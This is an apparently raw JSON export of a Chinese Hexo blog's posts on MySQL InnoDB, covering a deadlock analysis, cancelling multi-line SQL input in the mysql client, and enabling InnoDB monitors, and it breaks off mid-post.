2: len 7; hex 8d000001d00110; asc        ;;</div><div class=\"line\"> 3: len 4; hex 80000005; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** WE ROLL BACK TRANSACTION (2)</div></pre></td></tr></table></figure>\n<h4 id=\"死锁成因-1\"><a href=\"#死锁成因-1\" class=\"headerlink\" title=\"死锁成因\"></a>死锁成因</h4><p>事务T1执行查询语句，在索引b=6上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。<br>事务T2执行查询语句，在索引b=8上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。由于请求的GAP与已持有的GAP是兼容的，因此，事务T2在idx_b索引范围(4, 22)也能加锁成功。</p>\n<p>事务T1执行插入语句，会先加排他Insert Intention锁。由于请求的Insert Intention锁与已有的GAP锁不兼容，则事务T1等待T2释放GAP锁。<br>事务T2执行插入语句，也会等待T1释放GAP锁。<br>于是，死锁便产生了。</p>\n<p><strong>注</strong>：LOCK_ORDINARY拥有LOCK_GAP一部分特性。</p>\n<h4 id=\"思考：Insert-Intention锁在加哪级索引上？\"><a href=\"#思考：Insert-Intention锁在加哪级索引上？\" class=\"headerlink\" title=\"思考：Insert Intention锁在加哪级索引上？\"></a>思考：Insert Intention锁在加哪级索引上？</h4><p>这个排他锁加在PK上，还是二级索引上？</p>\n<h2 id=\"六、课后思考\"><a href=\"#六、课后思考\" class=\"headerlink\" title=\"六、课后思考\"></a>六、课后思考</h2><ol>\n<li><p>无主键的加锁过程<br>无PK时，会创建一个隐式聚簇索引。加锁在这个隐式聚簇索引会有什么不同？</p>\n</li>\n<li><p>复合索引加锁过程</p>\n</li>\n<li>多条件(where condition)加锁过程</li>\n<li><p>隐式锁与显式锁，隐式锁什么情况下会转换成显式锁</p>\n</li>\n<li><p>如果插入意向锁不阻止任何锁，这个锁还有必要存在吗？<br>目前看到的作用是，通过加锁的方式来唤醒等待线程。<br>但这并不意味着，被唤醒后可以直接做插入操作了。需要再次判断是否有锁冲突。</p>\n</li>\n</ol>\n<h2 id=\"七、补充知识\"><a href=\"#七、补充知识\" class=\"headerlink\" title=\"七、补充知识\"></a>七、补充知识</h2><h3 id=\"1-查看事务隔离级别\"><a href=\"#1-查看事务隔离级别\" class=\"headerlink\" title=\"1. 查看事务隔离级别\"></a>1. 查看事务隔离级别</h3><p>SELECT @@global.tx_isolation;<br>SELECT @@session.tx_isolation;<br>SELECT @@tx_isolation;</p>\n<h3 id=\"2-设置隔离级别\"><a href=\"#2-设置隔离级别\" class=\"headerlink\" title=\"2. 设置隔离级别\"></a>2. 设置隔离级别</h3><p>SET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}<br>例如：set session transaction isolation level read uncommitted;</p>\n<h3 id=\"3-查看auto-increment机制模式\"><a href=\"#3-查看auto-increment机制模式\" class=\"headerlink\" title=\"3. 查看auto_increment机制模式\"></a>3. 查看auto_increment机制模式</h3><p>show variables like ‘innodb_autoinc_lock_mode’;</p>\n<h3 id=\"4-查看表状态\"><a href=\"#4-查看表状态\" class=\"headerlink\" title=\"4. 查看表状态\"></a>4. 查看表状态</h3><p>show table status like ‘plan_branch’\\G;<br>show table status from test like ‘plan_branch’\\G;</p>\n<h3 id=\"5-查看SQL性能\"><a href=\"#5-查看SQL性能\" class=\"headerlink\" title=\"5. 查看SQL性能\"></a>5. 查看SQL性能</h3><p>show profiles<br>show profile for query 1;</p>\n<h3 id=\"6-查看当前最新事务ID\"><a href=\"#6-查看当前最新事务ID\" class=\"headerlink\" title=\"6. 查看当前最新事务ID\"></a>6. 查看当前最新事务ID</h3><p>每开启一个新事务，记录当前最新事务的id，可用于后续死锁分析。<br>show engine innodb status\\G;</p>\n<h3 id=\"7-查看事务锁等待状态情况\"><a href=\"#7-查看事务锁等待状态情况\" class=\"headerlink\" title=\"7. 查看事务锁等待状态情况\"></a>7. 查看事务锁等待状态情况</h3><p>select <em> from information_schema.innodb_locks;<br>select </em> from information_schema.innodb_lock_waits;<br>select * from information_schema.innodb_trx;</p>\n<h3 id=\"8-查看innodb状态-包含最近的死锁日志\"><a href=\"#8-查看innodb状态-包含最近的死锁日志\" class=\"headerlink\" title=\"8. 查看innodb状态(包含最近的死锁日志)\"></a>8. 查看innodb状态(包含最近的死锁日志)</h3><p>show engine innodb status;</p>\n<h2 id=\"八、参考文档\"><a href=\"#八、参考文档\" class=\"headerlink\" title=\"八、参考文档\"></a>八、参考文档</h2><p>[^1]: <a href=\"https://dev.mysql.com/doc/refman/5.6/en/innodb-parameters.html\">InnoDB Startup Options and System Variables</a><br>[^2]: <a href=\"http://dev.mysql.com/doc/refman/5.6/en/innodb-locking.html\">InnoDB Locking</a><br>[^3]: <a href=\"http://dev.mysql.com/doc/refman/5.6/en/innodb-index-types.html\">Clustered and Secondary Indexes</a><br>[^4]: <a href=\"http://www.cnblogs.com/renolei/p/4673842.html\">[MySQL] gap lock/next-key lock浅析</a><br>[^5]: <a href=\"http://hedengcheng.com/?p=771#comment-5543\">Intention Lock是否表级锁</a><br>[^6]: <a href=\"http://dev.mysql.com/doc/refman/5.6/en/innodb-locks-set.html\">Locks Set by Different SQL Statements in InnoDB</a></p>\n<p>[^8]: <a href=\"http://www.cnblogs.com/renolei/p/5559135.html\">AUTO_INCREMENT lock Handing in InnoDB</a><br>[^9]: <a href=\"http://blog.csdn.net/cug_jiang126com/article/details/50596729\">深入理解innodb的锁(record,gap,Next-Key lock)</a></p>\n<p>[^11]: <a href=\"http://dev.mysql.com/doc/refman/5.5/en/innodb-locks-table.html\">The INFORMATION_SCHEMA INNODB_LOCKS Table</a><br>[^12]: <a href=\"http://dev.mysql.com/doc/refman/5.5/en/innodb-trx-table.html\">The INFORMATION_SCHEMA INNODB_TRX Table</a><br>[^13]: <a href=\"http://blog.csdn.net/yanzongshuai/article/details/46398609\">mysql innodb插入意向锁</a></p>"},{"title":"中止错误的多行SQL语句执行","date":"2016-05-25T12:36:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n## 一、背景\n经常会出现在命令行编写多行SQL过程中，发现语法有问题。\n此时，需要中止错误的SQL语句，取消SQL执行。\n\n\n## 二、实例\n编写多行SQL，中途发现语法错误，可以通过`\\c`来中止。\n如若SQL内容较多，可以通过`\\p`打印出已经编写的SQL语句。\n\n``` bash\nmysql> select 123\n    -> \\p\n--------------\nselect 123\n--------------\n\n    -> \\c\n```\n\n<!-- more -->\n\n## 三、扩展知识\n更多mysql命令如下:\n``` bash\nList of all MySQL commands:\nNote that all text commands must be first on line and end with ';'\n?         (\\?) Synonym for `help'.\nclear     (\\c) Clear the current input statement.\nconnect   (\\r) Reconnect to the server. Optional arguments are db and host.\ndelimiter (\\d) Set statement delimiter.\nedit      (\\e) Edit command with $EDITOR.\nego       (\\G) Send command to mysql server, display result vertically.\nexit      (\\q) Exit mysql. Same as quit.\ngo        (\\g) Send command to mysql server.\nhelp      (\\h) Display this help.\nnopager   (\\n) Disable pager, print to stdout.\nnotee     (\\t) Don't write into outfile.\npager     (\\P) Set PAGER [to_pager]. Print the query results via PAGER.\nprint     (\\p) Print current command.\nprompt    (\\R) Change your mysql prompt.\nquit      (\\q) Quit mysql.\nrehash    (\\#) Rebuild completion hash.\nsource    (\\.) Execute an SQL script file. Takes a file name as an argument.\nstatus    (\\s) Get status information from the server.\nsystem    (\\!) Execute a system shell command.\ntee       (\\T) Set outfile [to_outfile]. Append everything into given outfile.\nuse       (\\u) Use another database. Takes database name as argument.\ncharset   (\\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.\nwarnings  (\\W) Show warnings after every statement.\nnowarning (\\w) Don't show warnings after every statement.\n```\n\n## 四、参考文档\n- [Mysql命令中断的问题 ](http://blog.sina.com.cn/s/blog_45ed26a7010002qi.html)\n- [mysql命令行,多行命令时如何取消/返回修改前边的命令](https://fukun.org/archives/02291811.html)\n","source":"_posts/article/database/中止错误的多行SQL语句执行.md","raw":"title: 中止错误的多行SQL语句执行\ntags:\n  - mysql\ncategories:\n  - 数据存储\ndate: 2016-05-25 20:36:00\n---\n\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n## 一、背景\n经常会出现在命令行编写多行SQL过程中，发现语法有问题。\n此时，需要中止错误的SQL语句，取消SQL执行。\n\n\n## 二、实例\n编写多行SQL，中途发现语法错误，可以通过`\\c`来中止。\n如若SQL内容较多，可以通过`\\p`打印出已经编写的SQL语句。\n\n``` bash\nmysql> select 123\n    -> \\p\n--------------\nselect 123\n--------------\n\n    -> \\c\n```\n\n<!-- more -->\n\n## 三、扩展知识\n更多mysql命令如下:\n``` bash\nList of all MySQL commands:\nNote that all text commands must be first on line and end with ';'\n?         (\\?) Synonym for `help'.\nclear     (\\c) Clear the current input statement.\nconnect   (\\r) Reconnect to the server. Optional arguments are db and host.\ndelimiter (\\d) Set statement delimiter.\nedit      (\\e) Edit command with $EDITOR.\nego       (\\G) Send command to mysql server, display result vertically.\nexit      (\\q) Exit mysql. Same as quit.\ngo        (\\g) Send command to mysql server.\nhelp      (\\h) Display this help.\nnopager   (\\n) Disable pager, print to stdout.\nnotee     (\\t) Don't write into outfile.\npager     (\\P) Set PAGER [to_pager]. Print the query results via PAGER.\nprint     (\\p) Print current command.\nprompt    (\\R) Change your mysql prompt.\nquit      (\\q) Quit mysql.\nrehash    (\\#) Rebuild completion hash.\nsource    (\\.) Execute an SQL script file. Takes a file name as an argument.\nstatus    (\\s) Get status information from the server.\nsystem    (\\!) Execute a system shell command.\ntee       (\\T) Set outfile [to_outfile]. Append everything into given outfile.\nuse       (\\u) Use another database. Takes database name as argument.\ncharset   (\\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.\nwarnings  (\\W) Show warnings after every statement.\nnowarning (\\w) Don't show warnings after every statement.\n```\n\n## 四、参考文档\n- [Mysql命令中断的问题 ](http://blog.sina.com.cn/s/blog_45ed26a7010002qi.html)\n- [mysql命令行,多行命令时如何取消/返回修改前边的命令](https://fukun.org/archives/02291811.html)\n","slug":"article/database/中止错误的多行SQL语句执行","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrb00265nbtk87ywm86","content":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>经常会出现在命令行编写多行SQL过程中，发现语法有问题。<br>此时，需要中止错误的SQL语句，取消SQL执行。</p>\n<h2 id=\"二、实例\"><a href=\"#二、实例\" class=\"headerlink\" title=\"二、实例\"></a>二、实例</h2><p>编写多行SQL，中途发现语法错误，可以通过<code>\\c</code>来中止。<br>如若SQL内容较多，可以通过<code>\\p</code>打印出已经编写的SQL语句。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select 123</div><div class=\"line\">    -&gt; \\p</div><div class=\"line\">--------------</div><div class=\"line\">select 123</div><div class=\"line\">--------------</div><div class=\"line\"></div><div class=\"line\">    -&gt; \\c</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"三、扩展知识\"><a href=\"#三、扩展知识\" class=\"headerlink\" title=\"三、扩展知识\"></a>三、扩展知识</h2><p>更多mysql命令如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">List of all MySQL commands:</div><div class=\"line\">Note that all text commands must be first on line and end with <span class=\"string\">';'</span></div><div class=\"line\">?         (\\?) Synonym <span class=\"keyword\">for</span> `<span class=\"built_in\">help</span><span class=\"string\">'.</span></div><div class=\"line\">clear     (\\c) Clear the current input statement.</div><div class=\"line\">connect   (\\r) Reconnect to the server. Optional arguments are db and host.</div><div class=\"line\">delimiter (\\d) Set statement delimiter.</div><div class=\"line\">edit      (\\e) Edit command with $EDITOR.</div><div class=\"line\">ego       (\\G) Send command to mysql server, display result vertically.</div><div class=\"line\">exit      (\\q) Exit mysql. Same as quit.</div><div class=\"line\">go        (\\g) Send command to mysql server.</div><div class=\"line\">help      (\\h) Display this help.</div><div class=\"line\">nopager   (\\n) Disable pager, print to stdout.</div><div class=\"line\">notee     (\\t) Don't write into outfile.</div><div class=\"line\">pager     (\\P) Set PAGER [to_pager]. Print the query results via PAGER.</div><div class=\"line\"><span class=\"built_in\">print</span>     (\\p) Print current command.</div><div class=\"line\">prompt    (\\R) Change your mysql prompt.</div><div class=\"line\">quit      (\\q) Quit mysql.</div><div class=\"line\"><span class=\"built_in\">rehash</span>    (\\<span class=\"comment\">#) Rebuild completion hash.</span></div><div class=\"line\"><span class=\"built_in\">source</span>    (\\.) Execute an SQL script file. Takes a file name as an argument.</div><div class=\"line\">status    (\\s) Get status information from the server.</div><div class=\"line\">system    (\\!) Execute a system shell command.</div><div class=\"line\">tee       (\\T) Set outfile [to_outfile]. Append everything into given outfile.</div><div class=\"line\">use       (\\u) Use another database. Takes database name as argument.</div><div class=\"line\">charset   (\\C) Switch to another charset. Might be needed <span class=\"keyword\">for</span> processing binlog with multi-byte charsets.</div><div class=\"line\">warnings  (\\W) Show warnings after every statement.</div><div class=\"line\">nowarning (\\w) Don<span class=\"string\">'t show warnings after every statement.</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ul>\n<li><a href=\"http://blog.sina.com.cn/s/blog_45ed26a7010002qi.html\" target=\"_blank\" rel=\"external\">Mysql命令中断的问题 </a></li>\n<li><a href=\"https://fukun.org/archives/02291811.html\" target=\"_blank\" rel=\"external\">mysql命令行,多行命令时如何取消/返回修改前边的命令</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>经常会出现在命令行编写多行SQL过程中，发现语法有问题。<br>此时，需要中止错误的SQL语句，取消SQL执行。</p>\n<h2 id=\"二、实例\"><a href=\"#二、实例\" class=\"headerlink\" title=\"二、实例\"></a>二、实例</h2><p>编写多行SQL，中途发现语法错误，可以通过<code>\\c</code>来中止。<br>如若SQL内容较多，可以通过<code>\\p</code>打印出已经编写的SQL语句。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select 123</div><div class=\"line\">    -&gt; \\p</div><div class=\"line\">--------------</div><div class=\"line\">select 123</div><div class=\"line\">--------------</div><div class=\"line\"></div><div class=\"line\">    -&gt; \\c</div></pre></td></tr></table></figure>","more":"<h2 id=\"三、扩展知识\"><a href=\"#三、扩展知识\" class=\"headerlink\" title=\"三、扩展知识\"></a>三、扩展知识</h2><p>更多mysql命令如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">List of all MySQL commands:</div><div class=\"line\">Note that all text commands must be first on line and end with <span class=\"string\">';'</span></div><div class=\"line\">?         (\\?) Synonym <span class=\"keyword\">for</span> `<span class=\"built_in\">help</span><span class=\"string\">'.</div><div class=\"line\">clear     (\\c) Clear the current input statement.</div><div class=\"line\">connect   (\\r) Reconnect to the server. Optional arguments are db and host.</div><div class=\"line\">delimiter (\\d) Set statement delimiter.</div><div class=\"line\">edit      (\\e) Edit command with $EDITOR.</div><div class=\"line\">ego       (\\G) Send command to mysql server, display result vertically.</div><div class=\"line\">exit      (\\q) Exit mysql. Same as quit.</div><div class=\"line\">go        (\\g) Send command to mysql server.</div><div class=\"line\">help      (\\h) Display this help.</div><div class=\"line\">nopager   (\\n) Disable pager, print to stdout.</div><div class=\"line\">notee     (\\t) Don'</span>t write into outfile.</div><div class=\"line\">pager     (\\P) Set PAGER [to_pager]. Print the query results via PAGER.</div><div class=\"line\"><span class=\"built_in\">print</span>     (\\p) Print current command.</div><div class=\"line\">prompt    (\\R) Change your mysql prompt.</div><div class=\"line\">quit      (\\q) Quit mysql.</div><div class=\"line\"><span class=\"built_in\">rehash</span>    (\\<span class=\"comment\">#) Rebuild completion hash.</span></div><div class=\"line\"><span class=\"built_in\">source</span>    (\\.) Execute an SQL script file. Takes a file name as an argument.</div><div class=\"line\">status    (\\s) Get status information from the server.</div><div class=\"line\">system    (\\!) Execute a system shell command.</div><div class=\"line\">tee       (\\T) Set outfile [to_outfile]. Append everything into given outfile.</div><div class=\"line\">use       (\\u) Use another database. Takes database name as argument.</div><div class=\"line\">charset   (\\C) Switch to another charset. Might be needed <span class=\"keyword\">for</span> processing binlog with multi-byte charsets.</div><div class=\"line\">warnings  (\\W) Show warnings after every statement.</div><div class=\"line\">nowarning (\\w) Don<span class=\"string\">'t show warnings after every statement.</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ul>\n<li><a href=\"http://blog.sina.com.cn/s/blog_45ed26a7010002qi.html\">Mysql命令中断的问题 </a></li>\n<li><a href=\"https://fukun.org/archives/02291811.html\">mysql命令行,多行命令时如何取消/返回修改前边的命令</a></li>\n</ul>"},{"title":"开启InnoDB监控","date":"2016-08-04T03:09:00.000Z","_content":"<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n当前mysql版本：5.6.27\n\n\n## 一、背景\n在mysql处理死锁问题时，由于`show engine innodb status`输出来的死锁日志无任务事务上下文，并不能很好地诊断相关事务所持有的所有锁信息，包括：锁个数、锁类型等。\n\n于是，需要能查看到更详细的事务锁占用情况。\n\n\n## 二、INNODB监控机制(InnoDB Monitors)\nmysql提供一套INNODB监控机制，用于周期性(每15钞)输出INNODB运行相关状态(INNODB运行状态、表空间状态、表状态等)到mysqld服务标准错误输出。另外，INNODB标准监控和锁监控，也可以通过命令：`show engine innodb status`输出到控制台。\n此部分内容一般输出到mysql error log里(查找日志位置，参见“补充知识”)。\n\n官方说明(详见参考文档1)如下：\n> ``` text\nWhen you enable InnoDB monitors for periodic output, InnoDB writes their output to the mysqld server standard error output (stderr). In this case, no output is sent to clients. When switched on, InnoDB monitors print data about every 15 seconds. Server output usually is directed to the error log (see Section 5.4.2, “The Error Log”). This data is useful in performance tuning. On Windows, start the server from a command prompt in a console window with the --console option if you want to direct the output to the window rather than to the error log.\n```\n\n该类监控机制默认是关闭状态，分析问题需要查看监控日志时再开启。\n建议分析问题后，将监控关闭；否则，每15秒输出一次INNODB运行状态信息到错误日志，会使用日志变得特别大。\n\n\n## 三、开启状态监控\nINNODB监控机制目前主要提供如下四类监控：\n - 标准监控(Standard InnoDB Monitor)：监视活动事务持有的表锁、行锁；事务锁等待；线程信号量等待；文件IO请求；buffer pool统计信息；InnoDB主线程purge和change buffer merge活动。\n - 锁监控(InnoDB Lock Monitor)：提供额外的锁信息。\n - 表空间监控(InnoDB Tablespace Monitor)：显示共享表空间中的文件段以及表空间数据结构配置验证。\n - 表监控(InnoDB Table Monitor)：显示内部数据字典的内容。\n\n关于四类监控开启与关闭方法，一言以蔽之，主要是通过创建系统可识读的特殊表名来完成。特别地，除表空间(InnoDB Tablespace Monitor)监控和表监控(InnoDB Table Monitor)外，其他二类监控还可能通过修改系统参数来完成。\n基于系统表的方式和基于系统参数的方式，只要使用二者其中一种方式开启监控即可。\n\n### 1. 标准监控(Standard InnoDB Monitor)\n\n#### 基于系统表：innodb_monitor\nmysql会通过检查是否存在名为`innodb_monitor`的数据表，来判断是否开启标准监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_monitor;\n```\n\n#### 基于系统参数：innodb_status_output\n自mysql 5.6.16版本之后，可以通过设置系统参数(`innodb_status_output`)的方式开启或者关闭标准监控。\n``` sql\nset GLOBAL innodb_status_output=ON;\nset GLOBAL innodb_status_output=OFF;\n```\n\n<!-- more -->\n\n### 2. 开启锁监控(InnoDB Lock Monitor)\n\n#### 基于系统表：innodb_lock_monitor\nmysql会通过检查是否存在名为`innodb_lock_monitor`的数据表，来判断是否开启锁监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_lock_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_lock_monitor;\n```\n\n#### 基于系统参数：innodb_status_output_locks\n自mysql 5.6.16版本之后，可以通过设置系统参数(`innodb_status_output_locks`)的方式开启或者关闭标准监控。\n``` sql\nset GLOBAL innodb_status_output=ON;\n\nset GLOBAL innodb_status_output_locks=ON;\nset GLOBAL innodb_status_output_locks=OFF;\n```\n\n**注**：前提需要开启 `innodb_status_output`\n\n\n## 3. 开启表空间监控(InnoDB Tablespace Monitor)\n\n#### 基于系统表：innodb_tablespace_monitor\nmysql会通过检查是否存在名为`innodb_tablespace_monitor`的数据表，来判断是否开启表空间监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_tablespace_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_tablespace_monitor;\n```\n\n**注**：表空间监控暂不支持通过参数方式配置，并且未来会被废弃。\n\n\n## 4. 开启表监控(InnoDB Table Monitor)\nmysql会通过检查是否存在名为`innodb_table_monitor`的数据表，来判断是否开启表监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_table_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_table_monitor;\n```\n\n**注**：表监控暂不支持通过参数方式配置，并且未来会被废弃。\n\n\n## 四、注意事宜\n\n### 1. 监控复位\n需要特别注意的一点是：mysql服务重启后，需要重启开启相应监控，才会生效。换句话说，服务重启后，之前配置的所有监控都被复位，处于关闭状态。\n\n基于系统表方式开启的监控，在mysql服务重启后，即使表存在，监控也不会生效。需要重启drop表，再create表，才能使监控生效。\n\n基于系统参数方式开启的监控，在mysql服务重启后，相关系统参数值都是OFF。需要重启设置对应的参数，才能使用监控生效。\n\n\n### 2. 错误日志大小\n不在停机或重启情况下，mysql每15秒输出一次INNODB运行状态信息到错误日志。\n这会使用日志变得越来越大。建议在需要的时候开启，不需要的时候关闭掉。\n\n\n### 3. 基于表方式将来会被废弃\n基于表方式将来会被废弃，使用基于系统参数的方式开启。\n> Use INFORMATION_SCHEMA or PERFORMANCE_SCHEMA tables or SET GLOBAL innodb_status_output=ON.\n\n\n### 4. 基于表方式无关表结构及内容\n基于表方式，mysql只检验表名被创建，则开启监控。\n至于，表创建到哪个数据库、表具体的数据结构、表里的内容都不关心，不会对监控开启有任何影响。\n\n### 5. 日志状态输出时间\n虽说状态日志是每15秒周期性输出一次，但是由于状态收集与输出也会占用一些时间，特别是表空间日志(INNODB TABLE MONITOR OUTPUT)和表日志(INNODB TABLESPACE MONITOR OUTPUT)。因此，两次日志时间并不是规律的间隔15秒，而是自上次输出后15秒加上收集输出监控日志的时间。\n\n\n\n## 五、补充知识\n\n### 1. 查看错误日志输出位置\n``` bash\nmysql root@localhost:test> select @@log_error;\n+----------------------------------------+\n| @@log_error                            |\n|----------------------------------------|\n| /usr/local/mysql/data/mysqld.local.err |\n+----------------------------------------+\n```\n\n### 2. 查看历史日志开启状态与输出位置\n``` bash\nmysql root@localhost:test> show VARIABLES like 'general%';\n+------------------+---------------------------------------+\n| Variable_name    | Value                                 |\n|------------------+---------------------------------------|\n| general_log      | ON                                    |\n| general_log_file | /usr/local/mysql/data/yerba-buena.log |\n+------------------+---------------------------------------+\n```\n\n### 3. 监控日志解读\n详见参考文档2及参考文档5\n\n\n## 六、参考文档\n1. [Enabling InnoDB Monitors](https://dev.mysql.com/doc/refman/5.6/en/innodb-enabling-monitors.html)\n2. [InnoDB Standard Monitor and Lock Monitor Output](https://dev.mysql.com/doc/refman/5.6/en/innodb-standard-monitor.html)\n3. [How to debug InnoDB lock waits](http://www.xaprb.com/blog/2007/09/18/how-to-debug-innodb-lock-waits/)\n4. [How to find out who is locking a table in MySQL](http://www.xaprb.com/blog/2006/07/31/how-to-analyze-innodb-mysql-locks/)\n5. [InnoDB Monitor](http://blog.csdn.net/zyz511919766/article/details/50147283)\n6. [INNODB监控开关](http://blog.sina.com.cn/s/blog_5037eacb0102vj1w.html)","source":"_posts/article/database/开启InnoDB监控.md","raw":"title: 开启InnoDB监控\ntags:\n  - mysql\n  - innodb\ncategories:\n  - 数据存储\ndate: 2016-08-04 11:09:00\n---\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n当前mysql版本：5.6.27\n\n\n## 一、背景\n在mysql处理死锁问题时，由于`show engine innodb status`输出来的死锁日志无任务事务上下文，并不能很好地诊断相关事务所持有的所有锁信息，包括：锁个数、锁类型等。\n\n于是，需要能查看到更详细的事务锁占用情况。\n\n\n## 二、INNODB监控机制(InnoDB Monitors)\nmysql提供一套INNODB监控机制，用于周期性(每15钞)输出INNODB运行相关状态(INNODB运行状态、表空间状态、表状态等)到mysqld服务标准错误输出。另外，INNODB标准监控和锁监控，也可以通过命令：`show engine innodb status`输出到控制台。\n此部分内容一般输出到mysql error log里(查找日志位置，参见“补充知识”)。\n\n官方说明(详见参考文档1)如下：\n> ``` text\nWhen you enable InnoDB monitors for periodic output, InnoDB writes their output to the mysqld server standard error output (stderr). In this case, no output is sent to clients. When switched on, InnoDB monitors print data about every 15 seconds. Server output usually is directed to the error log (see Section 5.4.2, “The Error Log”). This data is useful in performance tuning. On Windows, start the server from a command prompt in a console window with the --console option if you want to direct the output to the window rather than to the error log.\n```\n\n该类监控机制默认是关闭状态，分析问题需要查看监控日志时再开启。\n建议分析问题后，将监控关闭；否则，每15秒输出一次INNODB运行状态信息到错误日志，会使用日志变得特别大。\n\n\n## 三、开启状态监控\nINNODB监控机制目前主要提供如下四类监控：\n - 标准监控(Standard InnoDB Monitor)：监视活动事务持有的表锁、行锁；事务锁等待；线程信号量等待；文件IO请求；buffer pool统计信息；InnoDB主线程purge和change buffer merge活动。\n - 锁监控(InnoDB Lock Monitor)：提供额外的锁信息。\n - 表空间监控(InnoDB Tablespace Monitor)：显示共享表空间中的文件段以及表空间数据结构配置验证。\n - 表监控(InnoDB Table Monitor)：显示内部数据字典的内容。\n\n关于四类监控开启与关闭方法，一言以蔽之，主要是通过创建系统可识读的特殊表名来完成。特别地，除表空间(InnoDB Tablespace Monitor)监控和表监控(InnoDB Table Monitor)外，其他二类监控还可能通过修改系统参数来完成。\n基于系统表的方式和基于系统参数的方式，只要使用二者其中一种方式开启监控即可。\n\n### 1. 标准监控(Standard InnoDB Monitor)\n\n#### 基于系统表：innodb_monitor\nmysql会通过检查是否存在名为`innodb_monitor`的数据表，来判断是否开启标准监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_monitor;\n```\n\n#### 基于系统参数：innodb_status_output\n自mysql 5.6.16版本之后，可以通过设置系统参数(`innodb_status_output`)的方式开启或者关闭标准监控。\n``` sql\nset GLOBAL innodb_status_output=ON;\nset GLOBAL innodb_status_output=OFF;\n```\n\n<!-- more -->\n\n### 2. 开启锁监控(InnoDB Lock Monitor)\n\n#### 基于系统表：innodb_lock_monitor\nmysql会通过检查是否存在名为`innodb_lock_monitor`的数据表，来判断是否开启锁监控，并打印日志。\n需要开启，则创建表；需要关闭，则删除表。\n``` sql\nCREATE TABLE innodb_lock_monitor (a INT) ENGINE=INNODB;\nDROP TABLE innodb_lock_monitor;\n```\n\n#### 基于系统参数：innodb_status_output_locks\n自mysql 5.6.16版本之后，可以通过设置系统参数(`innodb_status_output_locks`)的方式开启或者关闭标准监控。\n``` sql\nset GLOBAL innodb_status_output=ON;\n\nset GLOBAL innodb_status_output_locks=ON;\nset GLOBAL 